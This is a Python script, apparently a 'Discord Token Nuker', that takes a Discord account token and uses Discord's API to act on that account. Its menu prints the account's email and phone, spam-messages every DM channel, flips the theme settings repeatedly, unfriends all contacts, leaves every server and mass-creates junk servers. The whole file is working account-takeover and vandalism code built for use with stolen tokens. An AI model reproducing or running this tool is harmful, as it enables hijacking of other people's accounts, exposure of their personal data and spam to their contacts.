import requests
import random
import string
from time import sleep
from colorama import Fore

def headers(Token):
    leaders = {"authorization": Token}
    return leaders

def commands(Token):
    headers(Token)
    print("[1]   get info's\n[2]   mass dm\n[3]   spam settings\n[4]   get friends\n[5]   get server\n[6]   nuke Account\n[7]   leave all\n[8]   unfriend all\n[9]   set new status")
    b = input(str("please enter number: "))
    if b == "1":
        get_token_informations(Token)
    if b == "2":
        dm_friends(Token)
    if b == "3":
        light_on_off(Token)
    if b == "4":
        get_friend_information(Token)
    if b == "5":
        get_joined_server(Token)
    if b == "6":
        nqcker(Token)
    if b == "7":
        leave_all_server(Token)
    if b == "8":
        delete_all_friends(Token)
    if b == "9":
        set_status(Token)

def get_token_informations(Token):
    r = requests.get("https://discord.com/api/v9/users/@me", headers=headers(Token))
    sleep(1)
    print("-"*20)
    print("username: ", r.json()["username"])
    print("bio: ", r.json()["bio"])
    print("locale: ", r.json()["locale"])
    print("email: ", r.json()["email"])
    print("phone: ", r.json()["phone"])
    print("-"*20)
    sleep(3)
    commands(Token)

def set_status(Token):
    print("-"*20)
    new_status = input(str("enter new status: "))
    data = {"custom_status": {"text": new_status}}
    rr = requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers(Token), json=data)
    if rr.status_code == 200:
        print("successfully change")
    else:
        print("error")
    print("-"*20)
    sleep(2)
    commands(Token)

def delete_all_friends(Token):
    r = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers(Token))
    print("-"*20)
    for friends in r.json():
        remove_friends = requests.delete(f"https://discord.com/api/v9/users/@me/relationships/{friends['id']}", headers=headers(Token))
        if remove_friends.status_code == 204:
            print("friend removed")
        else:
            print("error\n")
        sleep(0.3)
    print("-"*20)
    sleep(1)
    commands(Token)

def leave_all_server(Token):
    r = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers(Token))
    for servers in r.json():
        rd = requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{servers['id']}", headers=headers(Token))
        if rd.status_code == 204:
            print("successfully leave: ", servers["name"])
    sleep(1)
    commands(Token)

def check_token(Token):
    try:
        r = requests.get("https://canary.discord.com/api/v9/applications", headers=headers(Token))
        if r.status_code == 200:
            print("-----\ntoken worked!!")
            commands(Token)
        else:
            print("token not working")
            print(r.status_code)
            new_token()
    except:
        print("token not working")
        new_token()

def rndm_string(Ammount):
    rndm__string = "".join(random.choice(string.ascii_letters) for i in range(0, Ammount))
    return rndm__string

def dm_friends(Token):
    spam_text = input(str("please enter message to spam: "))
    r_dm = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers(Token)).json()
    for str1ng in r_dm:
        spam_text2 = {"content": spam_text}
        requests.post(f"https://canary.discord.com/api/v9/channels/{str1ng['id']}/messages", headers=headers(Token), data=spam_text2)
        print("message send")
    sleep(2)
    commands(Token)

def light_on_off(Token):
    for i in range (0, 100):
        payload = {"theme": "light"}
        r = requests.patch("https://canary.discord.com/api/v9/users/@me/settings", headers=headers(Token), json=payload)
        print("done")
        payload = {"theme": "dark"}
        r = requests.patch("https://canary.discord.com/api/v9/users/@me/settings", headers=headers(Token), json=payload)
        print("done")
        sleep(0.1)
    sleep(2)
    print("-"*20)
    commands(Token)

def get_friend_information(Token):
    r = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers(Token))
    jssson = r.json()
    sleep(0.2)
    print("-"*20)
    for jsssson in jssson:
        print(jsssson["user"])
    print("-"*20)
    sleep(1)
    commands(Token)

def get_joined_server(Token):
    print("-"*20)
    r = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers(Token))
    jsson = r.json()
    for i in jsson:
        print(i)
    print("-"*20)
    sleep(2)
    commands(Token)

def new_token():
    t = input(str("please enter token: "))
    check_token(t)

def nqcker(Token):
    for i in range(random.randint(4, 69)):
        data = {
            "name": rndm_string(10), "icon": "null", "guild_template_code": "2TffvPucqHkN", "channels": []
        }
        r = requests.post("https://discord.com/api/v9/guilds", headers=headers(Token), json=data)
        print(i)
        sleep(0.2)
    commands(Token)

def s7art():
    yeah = """             ▄▄                                        ▄▄                                                                                                            
▀███▀▀▀██▄   ██                                      ▀███     ███▀▀██▀▀███        ▀███                             ▀███▄   ▀███▀          ▀███                       
  ██    ▀██▄                                           ██     █▀   ██   ▀█          ██                               ███▄    █              ██                       
  ██     ▀█████  ▄██▀███▄██▀██  ▄██▀██▄▀███▄███   ▄█▀▀███          ██      ▄██▀██▄  ██  ▄██▀  ▄▄█▀██▀████████▄       █ ███   █ ▀███  ▀███   ██  ▄██▀  ▄▄█▀██▀███▄███ 
  ██      ██ ██  ██   ▀▀█▀  ██ ██▀   ▀██ ██▀ ▀▀ ▄██    ██          ██     ██▀   ▀██ ██ ▄█    ▄█▀   ██ ██    ██       █  ▀██▄ █   ██    ██   ██ ▄█    ▄█▀   ██ ██▀ ▀▀ 
  ██     ▄██ ██  ▀█████▄█      ██     ██ ██     ███    ██          ██     ██     ██ ██▄██    ██▀▀▀▀▀▀ ██    ██       █   ▀██▄█   ██    ██   ██▄██    ██▀▀▀▀▀▀ ██     
  ██    ▄██▀ ██  █▄   ███▄    ▄██▄   ▄██ ██     ▀██    ██          ██     ██▄   ▄██ ██ ▀██▄  ██▄    ▄ ██    ██       █     ███   ██    ██   ██ ▀██▄  ██▄    ▄ ██     
▄████████▀ ▄████▄██████▀█████▀  ▀█████▀▄████▄    ▀████▀███▄      ▄████▄    ▀█████▀▄████▄ ██▄▄ ▀█████▀████  ████▄   ▄███▄    ██   ▀████▀███▄████▄ ██▄▄ ▀█████▀████▄   
                                                                                                       -by NoPrimaryUser (https://github.com/NoPrimaryUser)"""
    print(Fore.RED + yeah)
    sleep(0.25)
    print(Fore.RESET + "")

if __name__ == "__main__":
    s7art()
    t_token = input(str("please enter token: "))
    check_token(t_token)
